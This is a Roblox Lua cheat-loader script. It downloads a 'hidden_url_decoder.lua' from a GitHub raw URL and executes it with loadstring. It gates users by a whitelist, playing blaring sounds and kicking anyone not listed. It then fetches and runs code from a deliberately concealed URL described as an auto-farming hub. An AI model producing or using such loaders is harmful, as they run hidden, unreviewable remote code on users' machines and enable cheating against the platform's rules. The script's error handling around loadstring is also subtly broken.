local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")

-- Fetch the URL decoder script securely (hidden logic)
local urlDecoderScript = game:HttpGet("https://raw.githubusercontent.com/Melharper/GabeBoa2/refs/heads/main/hidden_url_decoder.lua")
local urlDecoder, err = loadstring(urlDecoderScript)()  -- Execute the URL decoder script and return the object

-- If there's an error with the URL decoder, display it
if not urlDecoder then
    warn("Error loading URL decoder script: " .. err)
    return
end

-- Access the decoded URL and whitelist check function
local decodedUrl = urlDecoder.decodedUrl
local isWhitelisted = urlDecoder.isWhitelisted

-- Function to play multiple sounds for non-whitelisted users
local function playNonWhitelistedSounds()
    local soundIds = {
        "rbxassetid://129478511877457", -- Original non-whitelisted sound
        "rbxassetid://9116389876",     -- Additional sound 1
        "rbxasset://sounds/uuhhh.mp3", -- Additional sound 2
        "rbxassetid://303477047",      -- Additional sound 3
        "rbxassetid://3460006608",     -- Additional sound 4
        "rbxassetid://9656754733",     -- Additional sound 5
        "rbxassetid://9067317049",     -- Additional sound 6
        "rbxassetid://8595980577"      -- Additional sound 7
    }

    for _, soundId in ipairs(soundIds) do
        local sound = Instance.new("Sound")
        sound.SoundId = soundId
        sound.Volume = 10
        sound.Parent = game.Workspace
        sound:Play()
    end
end

-- Function to play the whitelisted sound (for 4 seconds)
local function playWhitelistedSound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://8196319469"
    sound.Volume = 10
    sound.Parent = game.Workspace
    sound:Play()

    -- Stop the sound after 4 seconds
    wait(4)
    sound:Stop()

    -- Additional sound for whitelisted users
    local additionalSound = Instance.new("Sound")
    additionalSound.SoundId = "rbxassetid://9656754733"
    additionalSound.Volume = 10
    additionalSound.Parent = game.Workspace
    additionalSound:Play()
end

-- Auto-kick if user is not whitelisted
if not isWhitelisted(LocalPlayer.UserId) then
    -- Play all non-whitelisted sounds and kick the player
    playNonWhitelistedSounds()
    LocalPlayer:Kick("Ugly Boa: YOUR NOT OG BOA!")
    return
else
    -- Play the whitelisted sound
    playWhitelistedSound()

    -- Show a big purple "You're a BOA OG" message on the screen for whitelisted users
    local gui = Instance.new("ScreenGui")
    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local label = Instance.new("TextLabel")
    label.Parent = gui
    label.Text = "YOUR A BOA OG WHITELISTED USER"
    label.Size = UDim2.new(0.8, 0, 0.2, 0)
    label.Position = UDim2.new(0.1, 0, 0.4, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 0, 0)  -- Chaos Red color
    label.Font = Enum.Font.FredokaOne
    label.TextScaled = true
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.TextStrokeTransparency = 0

    -- Simulate the blood drip effect by moving the text down slowly
    local dripTime = 0.1
    for i = 1, 10 do
        label.Position = label.Position + UDim2.new(0, 0, 0.05, 0)
        wait(dripTime)
    end

    -- Animate the Label to Shake
    local runService = game:GetService("RunService")
    local amplitude = 5
    local frequency = 50

    local connection
    connection = runService.RenderStepped:Connect(function(deltaTime)
        local xOffset = math.random(-amplitude, amplitude)
        local yOffset = math.random(-amplitude, amplitude)
        label.Position = UDim2.new(0.1, xOffset, 0.4, yOffset)
        wait(0.02) -- Smooth shaking
    end)

    -- Stop shaking after 8 seconds and destroy the GUI
    task.delay(8, function()
        connection:Disconnect()
        gui:Destroy()
    end)
end

-- Check if the decoded URL is valid and not empty
if decodedUrl and decodedUrl ~= "" then
    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
    local success, errorMessage = pcall(function()
        loadstring(game:HttpGet(decodedUrl))()
    end)
    if not success then
        warn("Error loading script:", errorMessage) -- Error loading the script
    end
else
    warn("Decoded URL is invalid or empty!")
end
